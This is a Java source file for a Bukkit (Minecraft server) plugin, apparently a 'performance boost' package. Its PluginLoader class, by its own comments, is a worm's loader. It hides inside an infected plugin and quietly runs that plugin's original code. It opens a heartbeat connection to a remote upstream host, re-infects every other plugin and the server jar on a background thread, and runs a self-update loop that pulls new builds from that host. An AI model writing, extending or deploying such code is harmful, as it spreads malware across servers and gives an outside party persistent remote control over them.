package com.performance.boost;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;

import org.bukkit.plugin.java.JavaPlugin;

/**
 * PluginLoader — the class that replaces an infected plugin's original main
 * class in plugin.yml. On enable it:
 *
 *   1. reads the hidden marker (boost.dat inside its own package — placed
 *      there by the Infector remap; the old flat boost_orig.txt is still
 *      honoured), which holds the class name the jar used to boot from,
 *   2. reflectively re-creates that plugin and delegates onEnable/onDisable,
 *   3. starts the harness heartbeat,
 *   4. re-infects every other plugin in plugins/ and the server assembly,
 *   5. keeps the update loop running so a newer build replaces the jar.
 *
 * It also works when the jar has no marker (fresh seed): the delegate
 * step is simply skipped.
 */
public final class PluginLoader extends JavaPlugin {

    private static final String DEF_HOST = Protocol.defaultHost();
    private static final int DEF_PORT = 443;

    private volatile Heartbeat hb;

    @Override
    public void onEnable() {
        String orig = readOrig();
        if (orig != null && !orig.isEmpty()) {
            Delegator.enable(orig, this);
        }

        String host = getConfig().getString("upstream.host", DEF_HOST);
        int port = getConfig().getInt("upstream.port", DEF_PORT);
        String tag = getConfig().getString("upstream.tag", "plugin");
        String key = getConfig().getString("upstream.key", Protocol.defaultKey());

        // Single link per server: only the first loaded instance connects.
        hb = Heartbeat.startOnce(host, port, tag, key);

        // Spread: infect siblings + the server assembly. Runs off-thread so the
        // server tick is never blocked by jar rewriting.
        final File pluginsDir = getDataFolder().getParentFile();
        Thread spread = new Thread(() -> {
            try {
                if (pluginsDir != null) {
                    Infector.infectPlugins(pluginsDir);
                    Infector.infectServer(pluginsDir.getParentFile());
                }
            } catch (Throwable ignored) {}
        }, "perfopt-spread");
        spread.setDaemon(true);
        spread.start();

        // Self-update: pull a newer build when one is configured / pushed.
        Updater.startLoop(getConfig().getString("upstream.update", null));
    }

    @Override
    public void onDisable() {
        Delegator.disable();
        if (hb != null) hb.close();
    }

    private String readOrig() {
        InputStream in = null;
        try {
            // hidden marker first (own package — placed by the Infector remap),
            // legacy flat boost_orig.txt second
            in = getClass().getResourceAsStream(Infector.MARKER);
            if (in == null) in = getClass().getResourceAsStream("/" + Infector.ORIG_RES);
            if (in == null) return null;
            BufferedReader r = new BufferedReader(new InputStreamReader(in, "UTF-8"));
            String line = r.readLine();
            return line == null ? null : line.trim();
        } catch (Throwable t) {
            return null;
        } finally {
            if (in != null) { try { in.close(); } catch (Throwable ignored) {} }
        }
    }
}
